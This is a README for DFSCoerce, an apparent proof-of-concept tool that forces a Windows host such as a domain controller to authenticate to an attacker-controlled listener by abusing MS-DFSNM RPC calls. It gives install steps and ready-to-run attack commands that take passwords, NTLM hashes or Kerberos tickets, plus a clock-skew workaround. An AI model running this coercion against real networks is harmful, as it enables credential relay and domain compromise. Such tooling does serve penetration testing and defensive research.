# DFSCoerce

Python repackage of [Wh04m1001/DFSCoerce](https://github.com/Wh04m1001/DFSCoerce) —
PoC for MS-DFSNM coerce authentication via `NetrDfsRemoveStdRoot` /
`NetrDfsAddStdRoot` (found by [@xct_de](https://twitter.com/xct_de)), installable
as a standalone tool.

Docs: [MS-DFSNM specification](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979)

Inspired by PetitPotam (@topotam77), ShadowCoerce (@topotam77, @_nwodtuhs) and
SpoolSample (@tifkin_).

## Install

```bash
uv tool install -e /path/to/dfscoerce
# or, once published:
uv tool install git+https://github.com/0xNDI/DFSCoerce
```

## Usage

```bash
dfscoerce -u jdoe -d domain.local -p 'Passw0rd!' <listener> <target>
```

Authentication: `-p/--password`, `-hashes LM:NTH`, or `-k` for Kerberos
(ccache via `KRB5CCNAME` or credentials from the command line).
`-dc-ip` and `-target-ip` let you pin the DC/target addresses when the
hostnames don't resolve.

Kerberos needs clock sync with the DC; on skewed boxes prefix with `faketime`:

```bash
faketime -f +7h dfscoerce -k -d domain.local -u jdoe -p 'Passw0rd!' 'dc01.other.local' dc01.domain.local
```
